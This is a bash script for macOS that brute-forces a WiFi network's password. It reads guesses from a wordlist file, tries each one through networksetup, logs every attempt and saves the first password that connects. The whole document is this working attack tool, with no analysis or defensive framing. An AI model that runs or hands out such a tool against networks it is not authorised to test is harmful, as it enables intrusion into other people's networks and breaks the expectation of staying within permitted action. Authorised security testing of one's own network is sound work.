#!/bin/bash

wifi_name=""
input_file="input.txt"
log_file="output.txt"
interface="en0"

echo "WiFi Password Testing Log - $(date)" > "$log_file"
echo "Network: $wifi_name" >> "$log_file"
echo "----------------------------------------" >> "$log_file"

log_message() {
    echo "$1" | tee -a "$log_file"
}

connect_network() {
    local password=$1
    
    log_message "🔄 Testing: $password"
    
    connection_output=$(networksetup -setairportnetwork "$interface" "$wifi_name" "$password" 2>&1)
    echo "$connection_output" >> "$log_file"
    
    if ! echo "$connection_output" | grep -q "Error"; then
        log_message "✅ CORRECT PASSWORD FOUND: $password"
        echo "$password" > successful_password.txt
        return 0
    fi
    
    return 1
}

if ! networksetup -listpreferredwirelessnetworks $interface | grep -Fwq "$wifi_name"; then
    log_message "❌ Network '$wifi_name' not found!"
    exit 1
fi

log_message "Starting password test for $wifi_name"

while IFS= read -r wifi_password || [[ -n "$wifi_password" ]]; do
    [[ -z "$wifi_password" ]] && continue
    
    if connect_network "$wifi_password"; then
        log_message "✓ Success! Script completed."
        exit 0
    fi
done < "$input_file"

log_message "❌ No working password found."
exit 1
